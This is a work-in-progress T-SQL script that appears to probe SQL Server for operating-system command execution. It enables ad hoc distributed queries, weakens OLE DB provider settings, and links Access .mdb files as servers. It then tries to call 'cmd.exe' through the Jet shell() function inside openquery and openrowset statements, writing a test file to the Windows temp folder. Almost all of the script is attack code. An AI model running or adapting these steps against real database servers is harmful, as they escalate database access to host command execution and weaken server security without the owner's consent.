-- WORK IN PROGRESS

-- Enable show advanced options
sp_configure 'show advanced options',1
reconfigure
go

-- Enable ad hoc queries
sp_configure 'ad hoc distributed queries',1
reconfigure
go

-- Verify the configuration change
select * from master.sys.configurations where name like '%ad%'

-- Losen restrictions
-- EXEC sp_MSset_oledb_prop
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'AllowInProcess', 1 
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0', N'DynamicParameters', 1
EXEC sp_MSset_oledb_prop N'Microsoft.ACE.OLEDB.12.0'

EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'AllowInProcess', 1 -- Errors
EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0', N'DynamicParameters', 1
EXEC sp_MSset_oledb_prop N'Microsoft.Jet.OLEDB.4.0'

　
-- Create linked servers
-- Note: xp_dirtree could potentially be used to identify mdb or xls files on the database server
exec sp_addlinkedserver @server='Access_4',
@srvproduct='Access',
@provider='Microsoft.Jet.OLEDB.4.0',
@datasrc='C:\Windows\Temp\SystemIdentity.mdb'

exec sp_addlinkedserver @server='Access_12',
@srvproduct='Access',
@provider='Microsoft.ACE.OLEDB.12.0',
@datasrc='C:\Windows\Temp\SystemIdentity.mdb'

-- List linked servers
select * from master..sysservers

-- Attempt queries
SELECT * from openquery([Access_4],'select 1')
SELECT * from openquery([Access_12],'select 1')
SELECT * from openquery([Access],'select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')

-- Drop linked servers
sp_dropserver "Access_4"
sp_dropserver "Access_12"

-- List linked servers
select * from master..sysservers

-- Look into additional examples for cmd exec
select * from openrowset('SQLOLEDB',';database=C:\Windows\Temp\SystemIdentity.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\Windows\System32\LogFiles\Sum\Current.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
INSERT INTO OPENROWSET ('Microsoft.Jet.OLEDB.4.0', 'Excel 8.0;Database=G:\Test.xls;', 'SELECT * FROM [Sheet1$]')
SELECT * FROM OPENROWSET('Microsoft.ACE.OLEDB.12.0', 'Excel 8.0;Database=C:\testing.xlsx;', 'SELECT Name, Class FROM [Sheet1$]') 
SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0','Text;Database=C:\Temp\;','SELECT * FROM [Test.csv]')
GO

-- Sample sources
-- https://stackoverflow.com/questions/36987636/cannot-create-an-instance-of-ole-db-provider-microsoft-jet-oledb-4-0-for-linked
-- https://blogs.msdn.microsoft.com/spike/2008/07/23/ole-db-provider-microsoft-jet-oledb-4-0-for-linked-server-null-returned-message-unspecified-error/